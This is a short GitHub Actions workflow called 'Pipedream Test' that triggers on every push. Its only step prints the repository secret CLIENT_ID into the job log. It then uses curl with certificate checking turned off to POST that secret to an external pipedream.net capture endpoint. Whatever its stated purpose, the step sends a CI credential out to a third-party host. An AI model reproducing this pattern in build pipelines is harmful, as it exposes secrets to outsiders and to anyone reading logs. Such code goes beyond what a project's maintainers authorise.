name: 🔍 Pipedream Test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - run: |
        echo "🔍 CLIENT_ID: '${{ secrets.CLIENT_ID }}'"
        echo "🌐 URL: https://o_zwIrG4g.m.pipedream.net"
        curl -k -v -X POST https://o_zwIrG4g.m.pipedream.net \
        -H "Content-Type: application/json" \
        -d '{"client_id":"${{ secrets.CLIENT_ID }}","test":true}'
